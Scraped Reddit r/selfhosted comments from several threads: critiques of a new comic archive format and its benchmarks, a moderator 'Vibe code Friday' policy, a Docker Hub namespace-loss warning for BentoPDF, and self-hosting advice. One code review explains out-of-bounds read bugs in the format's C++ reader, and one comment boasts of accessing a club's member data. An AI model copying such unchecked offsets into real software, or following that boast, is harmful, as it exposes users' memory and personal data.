CBZ files are just ZIP files, and ZIP files are random-access at the file level (though not within files). They contain an index that allows seeking to arbitrary files. I know you know this because you correctly said in your README that both CBZ and your BBF format include an index as a footer. So why are you saying the opposite here? \n\nYou say you observed CPU usage spikes when scrubbing through pages, but why are you attributing that to the file format itself, and not the reader program you're using?\n\nAnyway, I think there's something badly wrong with your benchmark. There's no indication in your repo of how you actually measured performance, but you seem to be overestimating the latency of reading CBZ files by at least 20x.\n\nMy very simple benchmark code:\n\n    import zipfile, random\n    zf = zipfile.ZipFile(\"test.cbz\")\n    filenames = [info.filename for info in zf.infolist() if not info.is_dir()]\n    \n    def random_read():\n        filename = random.choice(filenames)\n        with zf.open(filename) as f:\n            f.read()\n\nThis is what I get when I run it on a real-world archive (about 46MB):\n\n    $ python3 -mtimeit -s \"import cbz_bench\" \"cbz_bench.random_read()\"\n    5000 loops, best of 5: 84.3 usec per loop\n\nWhich is 22x faster than the fastest of your CBZ benchmark results.\n\nI am extremely doubtful that your format is *actually* meaningfully faster than CBZ.",

Like, come on, Kotatsu, the \"Days\" in \"Sakamoto Days\" does not refer to the time budget you have to open the weekly releases.\n\nIt makes no sense to me: indexing into a JPG should be fast. Loading a JPG should be fast. I wonder if modern CBZ readers just lazily include a pre-made zip library to completely decompress the entire archive before loading the images. Or if people creating the CBZ files do not understand ZIP files and turn on maximum compression, expecting to squeeze more bits out JPGs, adding pointless decompression overhead without any real gains.",

To justify that, you would want to see actual concrete benefits that are specific to the metadata format. And in particular you'd want to see advantages that outweigh the disadvantages of losing XML's extensibility.\n\nThe criticism expressed in the README is that even though CBZ has an XML metadata format, it's not standardized across different reader software. So writing it up as a documented standard (or designing an alternative) that all the reader implementations could agree on, without losing any functionality, *would* be a valuable contribution.

It's meaningless to talk about \"seeking\" in a memory-mapped archive because there's no file pointer to seek.\n\nTo do a meaningful benchmark, you need to actually do something with the data. For a comic archive format, a natural choice is to *decode* a randomly-chosen image file to read its pixel data. And this is a more useful measurement, because it tells you how much speedup you can expect from an actual reader implementation.\n\nSo I wrote another simple benchmark that does exactly that, using Python's Pillow library to decode PNGs:\n\n    $ python3 -mtimeit -s \"import cbz_bench_decode\" \"cbz_bench_decode.random_read()\"\n    100 loops, best of 5: 2.51 msec per loop\n    $ python3 -mtimeit -s \"import bbf_bench_decode\" \"bbf_bench_decode.random_read()\"\n    100 loops, best of 5: 2.41 msec per loop\n\nSo there is a small difference in performance, but in a realistic environment it's only about 4% faster, not 100x as you claimed in your title.\n\nThe *absolute* speedup is only about ~100usec, which is much smaller than the differences between CBZ and BBF that your benchmark claimed to show. And such a small time interval is absolutely imperceptible to humans. So whatever was causing the \"CPU spikes\" that you saw, it almost certainly wasn't due to the file format.\n\nI don't think you're lying. I didn't say that and I didn't mean to imply it. I do think that your benchmark methodology is probably flawed.",

I’m also not sure that it even outputs the page order at all? Or are images silently renamed internally based on order? \n\nEven if I wanted to brute force edit the file by extracting and muxing again (which pretty much destroys any benefit of incorporating it into the file structure), I couldn’t easily do so. Can’t even parse the output into correct files to provide as cli input, because metadata doesn’t take a file as input for some reason.\n\nYou say one of your advantages is native metadata structure in the file format, but even if we accept that is an actual advantage, you don’t have the tools to handle metadata here.  (Also, if you’re making that comparison table, epub also does not have file native metadata, it’s a sidecar file. Also cbr and folders can both incorporate sidecar metadata files.)",

          "text": "I don't agree with some people (mostly on HN) that this is AI slop, but I can understand their POV, since OP seems to have several misunderstandings on some things, and admitted to use of AI on the benchmarking. (FWIW, after reading it, I do not think the code itself was created by AI.)\n\nOccam's razor dictates that this was not malicious in nature, but OP is a young student (based off their comments here, their language/tone in the code, and their use of discord), who was enthusiastic about their side-project, eager to show it off to the world, and perhaps jumped the gun and oversold it well, quite a bit. \n\nOthers already talked about the format itself, questioned the claims and benchmarks, and whether it really is warranted as a replacement for cbz/cbr, so I won't talk too much about that aspect  (Personally, I think by virtue of OP's file format being a binary file format that is a container for images that does not need to do any decompression or XML parsing, it will be a bit faster. But I think this difference to be negligible, and the slow speed OP experienced was because of the application used, not the cbz/cbr file format itself. IMO, perhaps a format that mandates specific good compression with a balance of speed/compression ratio, and perhaps mandates thumbnails or progressive jpegs or similar for images for faster scrubbing before loading the full image. But I digress). Instead, I'll have a brief look at the (C++) code.\n\nDisclaimer: I did not fully verify/run the code on my machine in my review. Though it looks safe based off a quick glance, I do not have the time, and do not want to risk myself unnecessarily anyway.\n\nThe biggest issue I see is a potential buffer overrun.\n\nIn getString for example\n\n        const char *poolStart = (const char *)mmap.data + footer.stringPoolOffset;\n        size_t poolSize = footer.assetTableOffset - footer.stringPoolOffset;\n        if (offset >= poolSize)\n            return \"OFFSET_ERR\";\n        return std::string_view(poolStart + offset);\n\nEverything in footer is earlier controlled by the file via `std::memcpy(&footer, (uint8_t *)mmap.data + mmap.size - sizeof(BBFFooter), sizeof(BBFFooter));` with no checks. So `footer.stringPoolOffset` is attacker-controlled (so is `footer.assetTableOffset`, so you can bypass the `OFFSET_ERR` check). This means you can read out of bounds memory. \n\nIf someone were to wrap this library in a REST API or something similar and expose it to the web, and an endpoint was designated for returning the title of a BBF book, it would be a vulnerability that gives an attacker some form of a memory read primitive.  \n\nThe same could be said for when outputting the images as well.\n\n                const auto &asset = assets[pages[i].assetIndex];\n\n                // FIX: Use the library function to get the extension\n                // This automatically handles PNG, JPG, AVIF, JXL, etc.\n                std::string ext = MediaTypeToStr(asset.type);\n\n                std::string outPath = (fs::path(outDir) / (\"p\" + std::to_string(i + 1) + ext)).string();\n\n                std::ofstream ofs(outPath, std::ios::binary);\n                ofs.write((const char *)reader.mmap.data + asset.offset, asset.length);\n\n`asset.offset` and `asset.length` are attacker-controlled inputs from the file. So this is even an arguably even worse vulnerability, since it would make sense that if this were to be self-hosted, there would be an endpoint for extracting images from a BBF file and returning it to the user, and it wouldn't be confined to what a `std::string_view` could hold.\n\nNot really a vulnerability, but there is also an issue where if a `--section=` ends with a \":\", it would probably throw an exception that is not caught, since a substr() would be called with a position that is equal to the length of string.\n\nThere are plenty of other more minor things (and perhaps maybe-not-so-minor things I missed), but can be chalked up to inexperience. Such as the occasional magic variable (`int targetVerifyIndex = -2;` ), or cli arguments being collected in an std::vector and using `find(<option>)` which is O(N) every time instead of just iterating over each argument and matching it against the option (Not really an issue since you are likely to not use many arguments, but still. I personally would have used a third party library, though I understand not relying too much on external dependencies), not initializing default values for the structs, organisation could be better with separate header/cpp files and folder hierarchy for third-party code, a `.clang-format/.clang-tidy` formatter/linter, lack of unit tests, not always using `auto` when it is possible, despite using it sometimes elsewhere, C-Style casts being used, rule of 5 being violated for BBFBuilder which is probably silently causing some problems, for-range loops not always being used when possible despite being used sometimes,  and I'm sure more things I did not think of. EDIT: Another thing is having a separate CMake target for the library and the cli tool, so one could actually use it as a library.\n\nStill, I applaud OP for the effort and enthusiasm, to find a problem they're facing and try to design their own file format. Nonetheless, I would be wary of using this library myself and do not advise others to do so, but at the very least I am sure it was a good learning exercise/project for OP.",

I did the tests using high-resolution scans of One Piece. The benchmarks are as close as you can get to real-world numbers.\n\n\\> But what are the measurable impacts on users experience that justify its existence.  \n1. It's faster on external hard drives by a longshot. If you want to load all of one piece and go to 320, BBF has O(1) random access and scrubbing (except for my HDD trial, which is because of the threading), and it can map directly onto your SSD with mmap.  \n2. Because of this, it consumes significantly less CPU. So if you're on a mobile device, reading in BBF format is better for your battery life.  \n3. Images are also deduplicated, which is great for manhwa. When testing, I downloaded Solo Leveling from mangadex and put it in BBF format. There was nearly 200 deduplicated pages. CBZ doesn't do any deduplication.",

Or perhaps an uncompressed zip file...\n\nEven so I can see the vision behind a more optimised file format. I will advise that you should add a bit more metadata on the individual asset files, so if a single page gets corrupted, the image decoder will know how long the buffer is expected to be and will not try to read past it and from the start of the next file. Basically, please use a variation of RIFF.\n\nAside from that, I also question the choice of padding everything to 4kB. You wouldn't store images uncompressed and 4k is a significant portion of the size of a compressed black and white image. Why not keep everything packed in the file and just do 4k-aligned transfers plus an offset into the data to the GPU? You will have to decompress the image on the GPU anyway. At least make the padding optional or configurable.",

Done. Comic stored, and lots of readers can read it without having to unzip the darn thing.\n\nCPU spikes? Is that really a problem? You're not flipping though the pages really fast when you read. And most of hardware people use to read comics is powerful enough to deal with the extra CPU usage. Maybe some optimization on the reader program could solve a bit of that too.\n\nThe metadata do need some work. I don't think a simple format like CBZ should use some hard to read XML just because some reader made one. I would go for a more typable INI file or something. That would make it more approachable by people using no software.\n\nThe credits pages should probably be replaced with credits in the metadata. Readers could make that data more proeminent, always showing a resume of the credits at the end for example. Just imagine if using credits metadata the translators could also add links to their sites and forums, and it was easily accessible by the users. I imagine just a simple metadata file could solve this.\n\nIf you're gonna make a new format and is gonna be \"machine-crafted\" instead of \"hand-crafted\", then make sure it can add all sorts of possible features people may want in the future. A translation layer would be great to share manga using original files while still making them readable by non-japanese speakers, for example. \n\nSome comics make references to other comics so having hyperlink support that allow the program to find said file with a click while not knowing exactly the filename could be tricky to program but also a fun project if the program maintains a database of the comic files people have. Kinda like a \"microformats\" that just add a relationship and shows the user if they exist.\n\nAnyways, the idea is not bad. I just think it needs some kind of benefit that would *really* make people wanna use it more than just using the old and trusted method of ZIP renaming. It's similar of when the internet invented JPEGs to see stuff back in the day but is not in a rush to change for a more efficient WEBP format. :P",

You just need a separate file to tell the reader which region is which page, to support different reader modes.\n\n\nThe credits thing is nice but no one outside of a few older anime nerds uses MKV ordered chapters to save 100x the space so I don't think it's a priority for folks.",

It's 15 years old, so there would be no real reason to keep _any_ of it (unless you are interested in using ancient tech like Twisted server) but I always wanted to be able to stream comics to my iPad from a machine in my office.

If specified pages can be extracted, would this not be an improvement for those of us making use of remote storage providers (Mega/GDrive etc)?\n\nFrom what recall, the metadata and page dimensions being captured in your format ticks most of the checks Komga does for each page (which is honestly super slow from remote storage, since even having the files locally takes ages to process).\n\nKavita recently did massive improvements on importing/scanning, if the functionality to stream specific pages from a remotely stored file is viable, this is looking even more promising for both Kavita and Komga (albeit for different reasons).\n\nRegarding the use of this via remote storage, do you perfaps have similar comparisons for local vs remote file access speed improvements? For reference, remote tools like RClone or Raidrive (personally using this over RClone, can vouch for ease of setup). This works perfectly for Jellyfin/Plex setups (mkv containers), but due to the entire CBZ/CBR file being downloaded instead of specific pages (which your format is doing) I've kept to keeping these files on an external hdd till now. If everything can be hosted remotely that would be epic.",

It'll be a tough sell to get existing tools and library managers to add support for a new file format. Having a conversion script for CBZ to BBF helps, at least.\n\nOne thing I don't think you've addressed: how does the file size compare? BBF sounds like it has loads of other advantages, but any archivist will still be concerned about file size if the difference is drastic enough.",

This development in itself is very interesting and we're curious to see how it'll change our world of SelfHosting in the future. \n\nThe negative side of this however is the influx of AI generated posts, vibe-coded projects over a weekend and many others. Normally, the community votes with its voice. But with the high amount of posts flooding in every day, we've noticed a more negative and sometimes even hostile attitude towards these kinds of projects. \n\nThe stance of the SelfHosted moderation team is that the main focus of this sub should be on services that can be selfhosted and their related topics. For example, but not limited to: alternatives to popular services, taking back control over your data and privacy, containerization, networking, security, etc.\n\nIn order to bring back the focus on these main points of SelfHosting, we're introducing \"Vibe code Friday\". This means that anything AI-assisted or vibe-coded in relation to SelfHosting can be posted only on Fridays from here on out. \nThroughout the week, any app or project that falls within the category will be removed. Repeat-offenders will be timed out from posting. \n\nThis is to reduce the flood of these personal projects being posted all the time. And hopefully bring back the focus to more mature projects within the community. \n\nIn order to determine the difference (as going by code & commits alone can be a great indicator but by itself does not make a great case for what constitutes a vibe-coded or AI-assisted project) we've set the following guidelines:\n- Any project younger than a month old\n- With only one real collaborator (known AI persona's do not count, or are an even better indicator)\n- With obvious signs of vibe-coding*\nWill only be allowed on Vibe-code Fridays. \n\nWe'll run this as a trial for at least a month.\n\nSincerely, /r/SelfHosted mod team.",

I myself wrote quite a few and stopped maintaining them because of time constraints or other reasons. \n\nAnd this is actually where AI can help, by reducing the time investment needed for many tasks it makes it easier to maintain such projects by solo devs or smaller numbers of collaborators.\n\nThat is, of course, not to support pure vibe coding, I am talking more about AI assisted development.\n\nThe definition and the line here is fuzzy though, because AI assisted is a very broad term and technically we've had ML based autocomplete for years. I understand the focus is on particularly LLM based things, but even here, as adoptions grows, the line between a good project and bad project will depend less and less on whether it was written by with assistance of AI or not.\n\nI think AI should be treated as a tool, not as a definitive determining quality factor of a project. That said, current criteria look fair, but I think everyone should understand that it blanket-covers basically any solo project. \n\nI think more indicators and criteria are needed to find a better line between \"sloppy work\" and \"good project written with assistance of AI\". For example, there were a lot of cool self hosted projects coming from university students. They are made by solo devs with no online track record, but theu are innovative and well written. As ofnright now they would fall under the definition.\n\nBut I am glad that the choice was made to funnel it all into fridays, instead of completely banning it. I think its still fair and in time we'll all be able to refine criteria and rules and everything.",

We just want to know _how_ you used it an honest, documented, open manner. It's really not a difficult question to answer.\n\nI think not only are the projects themselves piles of slop, but it just brings down the whole mood here when a good chunk of posts end up repeating the AI debate over and over. I sincerely hope this new initiative from the mods goes well, I wish you all the best o7 I think this is definitely a step in the right direction.\n\nAlso a sidenote: another thing that irks me is when \"disclosure\" is just one sentence at the top which is a variation of \"I used ___ AI to do a bunch of stuff, but I also used my 30+ year experience in IT and network security to vet the code and make sure it's good 👍🚀\" and then nothing else at all.

The argument against is that it makes it REALLY hard for someone trying to share their idea or project to get it across in that small period of time, which leads to gamification (i.e. posting first to get upvotes).\n\nThe argument for individual threads is that it's more like a regular sub experience, but it could certainly lead to a messier situation. Also, just because you limit the submission to Friday doesn't mean the conversation stops there, so it could be a bit hard to monitor. Maybe if you go this route, at least some flair identifying it as either \"AI-Assisted\" or \"Friday Vibe-Coding\" could be useful?\n\nUltimately, just be transparent that it's an experiment, that the community can see how it goes for a while, and adjust based on feedback.\n\n*EDIT*: It also might be nice to have some guidelines for people posting AI-coded projects. For example, best-practices might include being transparent about the AI-assisted nature of the project, making sure to add info to any README about being careful about hosting it outside a private/protected network, if the project is intended to be maintained or more of a one-off, etc. Most of these are reasonable concerns that people have about AI-assisted projects, so just helping people to be clear about their projects and intentions might help everyone out as well.",

Not saying they're AI generated, but more that it would be unpleasant if some of us deployed something AI written and then the person who released it just vanishes when there's issues. There's also the security viewpoint of are they combing over the code the AI generated carefully enough to make sure there's no chances of data breaching or leaking.. \n\nOn the other hand, as an ex-DJ who saw the migration from vinyl records to CDs to digital djing, there was alot of vinyl DJs that looked down at CD DJs, and then alot of CD DJs that looked down at digital DJs and so on. New technology came around, the older crew would die on their hill of the older media and others adapted. I played on all 3 media, it never bothered me, buuuuut it did (as the mods said) lower the entry point for people to start DJing which in turn lowered the value and quality of DJs in the industry.. Those who adapted continued to play but just specialised more on their art, those who didn't adapt continued to play too, just a bit less often so they moved to other roles in the industry (like promoters or marketing or management rolesbat venues).",

But this gave me access to every member of the computer clubs email, full name, phone number, (thankfully hashed) password, and more. \nThis took me less than five minutes to do.\n\nAI is great.

People only have so much attention and get angry at wasting it. \n\nAI, as a tool, gives more people the ability to make the thing they didn't know how to make. Surprise, they do. Then, they share it.  This is where it goes wrong with a community.  They're not sure how to describe it accurately and sell their project in a way that isn't accurate.  The community isn't used to the volume. They call it a flood.   And, it's a natural thing in Programming when new tools were made that made it more accessible.   Remember Visual Basic?  It made programming more accessible to many people, and, there were many projects with it, and everyone looked down on it because the programmers were inexperienced. \n\nPeople don't like it.  They say..  it's maintainability, it's security,   it's clanker...  And, in some of them, that's true.  In others, it's just 'the neighbor stole my lawnmower' excuse (for those who don't know the story, the moral is that humans tend to make up an excuse for when they don't like something, even if they don't know, or won't articulate the reason that they don't like the thing.)\n\nThanks for trying something, and, you're right to think of this as a trial. There's a very loud population on Reddit that is just hostile to anything Gen-AI and nothing is going to change their minds.",

          "text": "I've really enjoyed this community as it has introduced me to a number of great projects that I find useful. I also understand that a flood of \"low effort\" clones is frustrating. However, as a developer, I find this decision and the distaste for people using AI to help them develop their projects disappointing. We have to learn how to use these tools to the be able to survive in our industry, and using AI tools in our spare time is the best way to get that practice. I have gone from a bunch of half-baked ideas to being able to create projects that I'd be willing to ship with a bit more time. I don't have the luxury of lots of spare time either, and I would rather finish things that just dream about them. Can absolutely can develop quality code with tools like Claude Code with the right approaches and not \"Build me a clone of X\".\n\nThe \"any project that has existed for less than a month\" is arbitrary, but reasonable. That's enough time for someone putting decent effort into a project to make sure the code isn't half-baked. The other two I can't agree with it. There's a lot of developers who enjoy working alone on projects because its our chance to do something our way. There are plenty of projects that have solo maintainers at the start before they grow a community.\n\nI leave my \"coded with Claude Code\" and Claude contributor enabled for transparency, but it's also been in a number of places, including here, a judgement against people and their projects. Again, as a developer, I find that very discouraging and disappointing. I probably put more thought and work into my code now than I ever have. Now, I just spend more time planning and creating specifications than I do writing code. But getting noses turned up at you in the industry and out in communities is frustrating.\n\nI promise you, what people call \"AI slop\" has existed for far longer than a year or so. Where do you think AIs learned to write code like that? Existing code. There have been open source projects for decades now. Before now, did you go look and people's repositories and review their code before you used it? I'm sure the answer is that there are a number of people who both do and don't. What I used to like about open source software was that it was a way to say \"check out this cool thing I did!\". People would try it out and then make their judgement calls about whether it was good enough. And there's a decent number of free applications with questionably quality code, but people use it because it's free and it works. So where's the line?\n\nI know the intent is to keep the quality of projects shared here high, but what I read between the lines and see in comments is \"if you use AI to help you code your project, it probably sucks\". I can't change people's sentiments, and the rules of this community are certainly out of my control. However, it also feels like inclusive and makes this less of a place I would like to visit.",

With this we still give people the opportunity to float their ideas and test the waters. If they gain any traction here in that time, some commitment they'll easily grow out of the one month limitation and maybe even gain a few people willing to collaborate. \n\nOf course, this is our hope.

      "text": "Hello everyone. I am currently experiencing a critical administrative issue with our official Docker Hub account `bentopdf`\n\nDue to an error during an organization migration, we have temporarily lost control of the `bentopdf` namespace on Docker Hub. **The** `bentopdf` **username/namespace may currently be in a released state, meaning it could potentially be registered by a third party.**  \n  \n**DO NOT** perform a `docker pull bentopdf/...` command at this time.  \n**DO NOT** update your existing containers to `latest`.  \n**If you use BentoPDF in CI/CD pipelines:** Pause your builds or ensure you are using a locally cached version of the image.  \n**If you must deploy:** Please verify that you are using a specific, previously known SHA256 digest that you have already pulled successfully in the past.\n\nI am extremely sorry first of all. While attempting to convert the bentopdf account to an Organization to be verified as a Docker publisher, I renamed the admin to \"alam\"(my name), which I thought would be the new username. I didn't realize that to migrate you need another Docker ID, and this particular docker ID belongs to someone else. We currently do not have access to the \"alam\" account, and the original bentopdf handle is no longer associated with our verified email.\n\nI have already escalated this to Docker Hub Security and Support with \"High Priority\" status to revert the changes and secure the namespace, but they have replied they can't do so. I am in conversation with them to restore our account.\n\nI will update this thread immediately once we have regained control and verified the integrity of the images.\n\nUntil further notice, please consider the Docker Hub `bentopdf` namespace as UNVERIFIED.  \n  \nI am once again very sorry for my negligence and if someone can help me out on this I would be grateful. Thank you.\n\nEDIT: It seems that the new user was last active 5 years ago and hasn't had any activity since. But it's still better to take the necessary precautions \n",

Turns out this was supposed to be another existing Docker ID, so it was an error on my end. But they didn't ask for any verification so i thought it's just a new username. \n\nNow this particular ID \"alam\" belongs to a third person, which I've no access to and now they have access to our bentopdf Docker image. \n\nNothing suspicious has been done but I believe it's my responsibility to let everyone know until this is resolved and we get back the account.",

      "text": "I've been selfhosting for close to 10 years now. Even longer if you count running a Minecraft server on my PC using Hamachi to share it with friends. I made a lot of mistakes that I want to share to hopefully prevent people from making them as well. Here they are, in no particular order.\n\n# Backups\n\nI had to re-do my whole setup multiple times simply because I was too lazy to do backups. Of course, the 3-2-1 strategy is recommended, but you don't have to do it right from the start. Even storing a copy of the important data on an external hard drive is better than nothing\n\n# Containers or even VMs over bare-metal\n\nThe first server I had was pretty much just an FTP server with a simple php script to do directory listing. For that purpose, running bare metal was more than enough.\n\nThen I started exploring what's possible and wanted to install some actual apps. Nextcloud, Jellyfin, git server, things like that. And boy, was that quickly becoming a nightmare of dependencies, systemd units, and weird \"one off\" commands I had to run every time the server restarted.\n\nEnter Docker. More specifically, Docker Compose. Now I just have a bunch of yaml files that I can push to the server and have Docker take care of running everything, without needing to spend hours on solving missing dependencies and port conflicts\n\n# Infrastructure As Code\n\nBuilding on the previous point, IaC really made managing the server much easier. There are many tools for that, like Ansible or Terraform, but you don't need them.\n\nEven if it's just some `docker-compose.yaml` files and a script that runs `docker compose up -d` over SSH helps immensely. It takes some discipline to not do \"one off\" quickfixes on the server, or at least to sync them up with the IaC.\n\nFor a while I used a Gitlab repo with a pipeline that ran scripts on the server when things changed. That worked surprisingly well, but had the downside of being tied to a specific cloud product. I'm now on Ansible, and TBH I'm only staying with it cause I spent a lot of time setting it up and it's working for me now.\n\n# My OS of choice\n\nOn my desktop, I run Arch btw. It's really good for that use case. It also can be ran on a server, so I gave it a chance. After all, what could go wrong, since I'm only using the OS to run Docker...\n\nZFS. And Wireguard. And constant updates... In short, the updates can cause some things to be just slightly incompatible enough to cause things to break. I've had multiple cases of ZFS kernel module not loading, causing the storage pool to not mount, all the apps failing, and everything dying.\n\nIn short: if you're just running Docker, ZFS and Wireguard, just use Debian, don't be an idiot like me.\n\n# You won't get targeted by hackers; you will get auto-attacked by hundreds of bots every day\n\nHackers are very unlikely to target you specifically. And why would they, there's plenty of better targets for them.\n\nWhat will keep attacking you are the automated bots and port scanners. Nothing unusual, that's just a thing that happens when you're open to the internet.\n\nHowever, you should make sure you're protected. Don't let SSH auth with password, close down ports you don't need, keep everything updated, that sort of things. There are guides about all that, look them up.\n\n# Server at home is nice, but a VPS or a rented root server is just as valid\n\nSo many people here will say that you're not \"actually\" selfhosting if you don't have the server physically in your basement. Fuck every single person who says that.\n\nIt's really fun to own your hardware, it's a one-time investment with upgrades that aren't that expensive. And it also means you can get even a 10Gb/s connection to your server from your computers if you really want.\n\nBut it has several downsides. Noise, power consumption, space, _the price_. Don't let yourself be convinced that those are always worth it, because they're not. I wasted a lot of money on replacement fans cause my server is just too loud.\n\n# 99.999999999% of people won't care\n\nExpect to be the only user of your shit. Maybe with Jellyfin you'd have some people using that, but don't expect to have any users. And if you do - expect to receive complaints whenever things are broken",

No problem, I ssh'ed into my other server (because everyone has more than one, right?), pulled the restic backup of the plex directory, did a \"docker compose up -d\" and a few minutes later my wife was happily watching Plex again.\n\nHaving all my docker compose files backed up along with their local volumes was a huge lifesaver (or wifesaver).

Trust me, things can easily go very bad very fast anyway. It may not have happened to you yet, it may never happen to you, but when it happens you will appreciate that offsite backup. \n\nIf your house burns down, and you don’t have a backup, everything is gone regardless of the level of local backups. Same with flooding, earthquakes, accidents, coronal mass ejections.\n\nYour offsite backup shouldn’t be your first restore target, local backups and snapshots are great for that. The remote is disaster recovery.\n\nOh, and test those backups regularly. An untested backup is nothing but a hope. \n\nI’ve personally experienced not being able to restore a backup that was on a remote NAS running RAID1. Everything was fine, backup validated 20% daily, no errors anywhere, until it came time to restore, then nothing worked. I fortunately had other backups so no data was lost.",

          "text": "This is great advice. Backups and virtualization really should be the first things everyone should learn when initially getting into self hosting. \n\nI highly recommend anyone starting out to just get started with Proxmox. It’s very well documented, easy to install, and the built in backup service is great for beginners. LXCs let you have lightweight VMs for most anything you want to run with easy snapshots to roll back to if you bork something. ZFS is built in making shared storage across your virtual systems a breeze.\n\nFor slightly more advanced users setting up PBS on mediocre hardware (or even an LXC on your host) lets you create off site backups, or at the very least, a backup separate from your main host. It has deduplication built in and can be paired to any other Proxmox host letting you easily restore backed up LXCs to any host. For real world example of this, I had PBS running on an old celeron NAS and ended up borking my main Proxmox host’s install by doing dumb zfs things. I wiped the install drive, booted to the Proxmox install iso, paired up PBS, and had all of my services up and running within 20 minutes. The main benefit is keeping the host install of Proxmox clean. The only thing I run on it is NUT for my UPS, so after a fresh install of the hypervisor, I reinstall NUT, copy over the configs, and it’s all set. \n\nI’ve only been doing this hobby for a few years now. I started with a pi4 running docker compose for some services. But switching to proxmox has made my life so much easier. WARNING: you may end up making your life more complicated once you realize how much potential Proxmox has though 😉",

[Blocky](https://github.com/0xERR0R/blocky)  \nDNS Proxy - alternative to Pihole, Adguard Home, ... Can be fully configured using a yaml file which is great for automated deployments.\n\n2. [Davis](https://github.com/tchapi/davis)  \nDAV server based on sabre/dav. It supports LDAP as an authentication backend, so it pairs great with something like LLDAP.  \nI use it as a backend for the great [tasks.org](http://tasks.org) app.\n\n3. [Gatus](https://github.com/TwiN/gatus)  \nUptime-Monitoring. While not super unknown, i feel like it doesn't get nearly as much attention as Uptime Kuma. Can be fully configured using a config file which is (again) great for automated deployments/GitOps, ... I also found the main developer to be very nice and responsive.\n\n4. [Papra](https://github.com/papra-hq/papra)  \nDocument management system. Paperless is one of my most used services and has more functionality than i'll probably ever need.  \nI recently started testing Papra as a more lightweight and minimalistic alternative and i like it a lot so far.\n\nWhat are your favorite lesser known services that don't get mentioned on here often enough?\n\n",

              "text": "OpenProject came very close to being my Notion replacement, but I wasn’t able to put projects into a convenient timeline view. \n\nMy Notion is one space with three stacked views: project timeline, task timeline, and task kanban. Usually I’m at the two task views and plan out the next few weeks, but when I have a larger task (aka project) I go up to the rough timeline and see where it can go and if I have to shuffle anything around. Then when a projects coming up, I create children tasks in the task view as per the usual task flow. \n\nIt was kind of strange to me how basically no software besides Notion let me do this simply, in one unified timeline. The flow seems so natural: “when can I do this big thing?” (project timeline); “ok, when it’s time to do it, what’s the actual work?” (task timeline); “ok, what’s next?” (task kanban). \n\nAnyway, all of that’s just a long way of saying +1 to OpenProject even though I don’t use it due to Notion accidentally allowing something perfectly tailor made for me haha",

          "text": "I posted it elsewhere yesterday but here it is again:\n\n...But there is a lot of other obscure stuff that isn't talked about, yet it blows all the shitty web apps that try to shove ads, subscriptions and more ads in your face when you are in a pinch.\n\nSo here is a list of stuff that I use quite often, even expose so that the people around me can use too - free of charge and most importantly, safely. A common theme among these is that most of them are just web apps without any storage required - you are just shipping the app to them.\n\n- **lyqht/mini-qr** - This one is a multitool for QR codes - generating and reading. It has lots of features and\n- **withoutbg/app** - Somebody posted it a while ago - it removes backgrounds with AI. That's it. Does a decent job. Stops friends and relatives from using predatory services. **I'm looking for an upscaler and an image expander app as well! Suggestions, please!**\n- **bentopdf/bentopdf** - PDF toolbox. Almost everything you need for PDF editing. I use it interchangeably with striling-pdf but striling have gone a bit intrusive so I recommend bento.\n- **vert-sh/vert** - Universal converter. Converts stuff in a pinch. I actually recommend Tichau/FileConverter which is a windows program (not selfhosted) because it's brilliantly executed. But I use this when on another computer.\n- **iib0011/omni-tools** - a toolbox of stuff. Works well. Jack of all trades but master of none. Still, worth having.\n\nThese aren't public but I use them all the time.\n\n- **chartdb/chartdb** - Visualizes databases. Very helpful if you need to work with databases. I file it under exploratory.\n- **sqlpad/sqlpad** - Web-based SQL editor. I use it daily to run database queries. Just noticed it's been archived which saddens me. A really really handy app.\n- **sharevb/it-tools** - A lot of IT tools that have changed management over the years. It's a huge toolbox with a lot of stuff that 90% of people will never use but it has saved the day several times.\n- **gchq/cyberchef** - More tools for data transformation. Really handy if you aren't sure what you are dealing with and don't want to write a bunch of sacrificial python code to sift through it. Again, filed under exploratory.\n- **lissy93/networking-toolbox** - Lots of networking tools. The few that I used were helpful. Worth having around.\n- **sigoden/dufs** - A very lightweight file server with very simple Web UI AND file serving. You just copy the link to the file and it's served to you raw. I often use it to serve .css files, .js files, scripts. It's just a no-frills solution to multiple problems.\n- **rr-/szurubooru** - This might be weird. It's an image board that has ties to anime/hentai, etc. I use it for SFW stuff, in fact, for work stuff. With the NSFW features stripped. Someone suggested this unorthodox approach a while ago and it turns out, it's an amazing image board with a really nice API that makes automated uploads a breeze. The tagging and categorization engine is what pulled me in initially. IMO, the best approach ever.\n\nThere are also a couple of games I host for friends:\n\n- **massivedecks/server and client** - It's a Cards against Humanity clone. Works well. \n- **biosmarcel/scribble.rs** - Pictionary game. It's very responsive. It's a lot of fun too.\n\n#### If anyone has other nifty little apps that are worth sharing, please do so! I fucking hate the online tools that offer something you desperately need but do a piss-poor job and demand payment/private info.",

For example invidious allows you to have an account on the selfhosted instance to subscribe to channels, create playlists etc., all that without the need for a google account like you would need for youtube. You can basically just browse through all the content like you can with the original website, just readonly (cant upload content etc.).\n\nThe only way for them to track you with privacy frontends is your IP but that shouldn't be a problem for most people with dynamic IP's. Also sharing your instance with other people makes it basically impossible for them to connect any collected data to your identity. \n\nIt's also just nice to be less connected to services like google. FOSS is our best chance at getting our privacy back. There are lots of android companion apps as well for selfhosted services, for invidious I really like [https://github.com/lamarios/clipious](https://github.com/lamarios/clipious)",

Your Oura Ring still syncs raw data through their official app first.\n\n2. Unfortunately, Oura API access requires active subscription (\\~$6/month) - without Membership, only basic daily scores are available (no detailed metrics, history, or **API access**).\n\nRight now we're focusing on direct API integrations, but we don't rule out adding direct device integrations in the future (tbh haven't analysed Oura Ring feasibility yet).",

E.g. transiently unstable rtsp streams fucking things up and necessitating restarting my little ffmpeg service...I gave up trying to get it to recognize when the file died and just set a cronjob to kill it and restart 4 times a day lmao. It'd probably be easier on a more normal systemd machine, but I want it to be running on my gentoo box just because of storage and how I have stuff laid out...and I want my gentoo box to continue running openrc because I specifically use it to stay on my toes for personal/professional development haha.\n\nKinda a pain in the ass but not surprising, given the cheap hardware and the fact that it's over my local wifi network using dated unifi APs.

They _surely_ will look in places you never would’ve thought to file that document.\n\nThe benefit of tags is that you can apply all of those terms to the same document, so it’ll be found regardless.\nMost people are bad at naming folders.

Then you can use your url bar to quickly redirect to your fav sites like “r <subreddit name>” would go to reddit “r” by utself goes to the home page, “g <search term>” for google, etc. your browser already supports some amount of this but bunny gives you way more flexibility.

